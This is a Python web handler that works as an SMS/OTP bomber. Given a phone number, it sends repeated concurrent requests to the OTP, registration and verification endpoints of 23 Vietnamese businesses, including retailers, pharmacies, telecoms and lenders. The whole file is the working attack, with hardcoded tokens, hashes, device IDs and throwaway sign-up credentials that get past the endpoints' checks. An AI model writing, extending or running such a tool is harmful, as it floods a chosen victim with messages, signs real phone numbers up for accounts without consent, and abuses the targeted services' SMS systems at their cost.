from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import requests
from concurrent.futures import ThreadPoolExecutor
import time

threading = ThreadPoolExecutor(max_workers=30)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        phone = params.get('phone', [''])[0]
        amount = int(params.get('amount', ['1'])[0])
        
        if amount > 10:
            amount = 10
        
        if not phone:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Thiếu SĐT"}).encode())
            return
        
        for i in range(amount):
            # Gọi TẤT CẢ API cùng lúc
            threading.submit(popeyes, phone)
            threading.submit(alfrescos, phone)
            threading.submit(tv360, phone)
            threading.submit(bibabo, phone)
            threading.submit(gapo, phone)
            threading.submit(vieon, phone)
            threading.submit(meta, phone)
            threading.submit(tamo, phone)
            threading.submit(fptshop, phone)
            threading.submit(viettel, phone)
            threading.submit(tgdd, phone)
            threading.submit(pizzahut, phone)
            threading.submit(concung, phone)
            threading.submit(nhathuoclongchau, phone)
            threading.submit(pharmacity, phone)
            threading.submit(ghn, phone)
            threading.submit(beecow, phone)
            threading.submit(thantaioilo, phone)
            threading.submit(vayvnd, phone)
            threading.submit(ecogreen, phone)
            threading.submit(phuclong, phone)
            threading.submit(winmart, phone)
            threading.submit(oldloship, phone)
            time.sleep(0.15)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            "status": "success",
            "phone": phone,
            "amount": amount,
            "total_apis": 23
        }, ensure_ascii=False).encode())

# ====== GIỮ NGUYÊN TẤT CẢ HÀM API ======
def popeyes(sdt):
    try:
        requests.post('https://api.popeyes.vn/api/v1/register',
            headers={'content-type':'application/json','origin':'https://popeyes.vn'},
            data='{"phone":"'+sdt+'","firstName":"Cac","lastName":"Lo","email":"kong@gmail.com","password":"12345gdtg"}', timeout=5)
    except: pass

def alfrescos(sdt):
    try:
        requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms',
            headers={'brandcode':'ALFRESCOS','content-type':'application/json'},
            data='{"phoneNumber":"'+sdt+'","secureHash":"66148faf3cab6e527b8b044745e27dbd","type":1}', timeout=5)
    except: pass

def tv360(phone):
    try:
        requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login",
            headers={"Content-Type":"application/json"},
            json={"msisdn":"0"+phone[1:11]}, timeout=5)
    except: pass

def bibabo(sdt):
    try:
        requests.post("https://bibabo.vn/user/verify-phone",
            headers={"Content-Type":"application/x-www-form-urlencoded","Origin":"https://bibabo.vn"},
            data={"phone":sdt,"token":"UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"}, timeout=5)
    except: pass

def gapo(sdt):
    try:
        requests.post("https://api.gapo.vn/auth/v2.0/signup",
            headers={"Content-Type":"application/json","Origin":"https://www.gapo.vn"},
            data=json.dumps({"device_id":"30a1bfa0-533f-45e9-be60-b48fb8977df2","phone_number":"+84-"+sdt[1:11],"otp_type":0}), timeout=5)
    except: pass

def vieon(sdt):
    try:
        requests.post('https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021',
            headers={'content-type':'application/x-www-form-urlencoded','origin':'https://vieon.vn'},
            data={'phone_number':sdt,'password':'1234gdtg','device_id':'57f3ffd77ad209a626c1ea607d0c4775','platform':'mobile_web','ui':'012021'}, timeout=5)
    except: pass

def meta(sdt):
    try:
        requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1',
            headers={'content-type':'application/json','origin':'https://meta.vn'},
            data='{"api_args":{"lgUser":"'+sdt+'","act":"send","type":"phone"},"api_method":"CheckExist"}', timeout=5)
    except: pass

def tamo(phone):
    try:
        requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",
            headers={"Content-Type":"application/json"},
            json={"mobilePhone":{"number":"0"+phone[1:11]}}, timeout=5)
    except: pass

def fptshop(phone):
    try:
        requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification",
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            data={"phone":phone}, timeout=5)
    except: pass

def viettel(phone):
    try:
        requests.post('https://vietteltelecom.vn/api/get-otp-login',
            headers={'Content-Type':'application/json','Origin':'https://vietteltelecom.vn','X-CSRF-TOKEN':'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6'},
            json={'phone':phone,'type':''}, timeout=5)
    except: pass

def tgdd(sdt):
    try:
        requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            headers={'content-type':'application/x-www-form-urlencoded','x-requested-with':'XMLHttpRequest','origin':'https://www.thegioididong.com'},
            data={'phoneNumber':sdt,'isReSend':'false','sendOTPType':'1'}, timeout=5)
    except: pass

def pizzahut(sdt):
    try:
        requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest",
            headers={"Content-Type":"application/json","Origin":"https://pizzahut.vn"},
            data=json.dumps({"keyData":f"appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={sdt}"}), timeout=5)
    except: pass

def concung(phone):
    try:
        requests.post("https://concung.com/ajax.html",
            headers={"Content-Type":"application/x-www-form-urlencoded","Origin":"https://concung.com"},
            data={"ajax":"1","classAjax":"AjaxLogin","methodAjax":"sendOtpLogin","customer_phone":phone}, timeout=5)
    except: pass

def nhathuoclongchau(sdt):
    try:
        requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers={'content-type':'application/json','origin':'https://nhathuoclongchau.com.vn'},
            data='{"phoneNumber":"'+sdt+'","otpType":0,"fromSys":"WEBKHLC"}', timeout=5)
    except: pass

def pharmacity(sdt):
    try:
        requests.post('https://api-gateway.pharmacity.vn/customers/register/otp',
            headers={'content-Type':'application/json','origin':'https://www.pharmacity.vn'},
            data='{"phone":"'+sdt+'","referral":""}', timeout=5)
    except: pass

def ghn(sdt):
    try:
        requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
            headers={'content-type':'application/json','origin':'https://sso.ghn.vn'},
            data='{"phone":"'+sdt+'","type":"register"}', timeout=5)
    except: pass

def beecow(sdt):
    try:
        requests.post('https://api.beecow.com/api/register/gosell',
            headers={'content-type':'application/json','origin':'https://admin.gosell.vn'},
            data='{"password":"12345cc@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"'+sdt+'"}}', timeout=5)
    except: pass

def thantaioilo(phone):
    try:
        requests.post("https://api.thantaioi.vn/api/user/send-one-time-password",
            headers={"Content-Type":"application/json","Origin":"https://thantaioi.vn"},
            data=json.dumps({"phone":f"84{phone[1:11]}"}), timeout=5)
    except: pass

def vayvnd(sdt):
    try:
        requests.post('https://api.vayvnd.vn/v2/users',
            headers={'content-type':'application/json','origin':'https://vayvnd.vn'},
            data='{"phone":"'+sdt+'","utm":[{"utm_source":"google","utm_medium":"organic"}],"sourceSite":3}', timeout=5)
    except: pass

def ecogreen(sdt):
    try:
        requests.post('https://ecogreen.com.vn/api/auth/register/send-otp',
            headers={'content-type':'application/json','origin':'https://ecogreen.com.vn'},
            data='{"phone":"'+sdt+'"}', timeout=5)
    except: pass

def phuclong(sdt):
    try:
        requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register',
            headers={'content-type':'application/json','origin':'https://order.phuclong.com.vn'},
            data='{"phoneNumber":"'+sdt+'","fullName":"Lo Cac","email":"KAka@gmail.com","password":"12345cc@@@"}', timeout=5)
    except: pass

def winmart(sdt):
    try:
        requests.get(f'https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}',
            headers={'accept':'application/json'}, timeout=5)
    except: pass

def oldloship(phone):
    try:
        requests.post("https://mocha.lozi.vn/v6/invites/use-app",
            headers={"Content-Type":"application/json"},
            data=json.dumps({"device":"Android","platform":"Chrome","countryCode":"84","phoneNumber":phone[1:11]}), timeout=5)
    except: pass
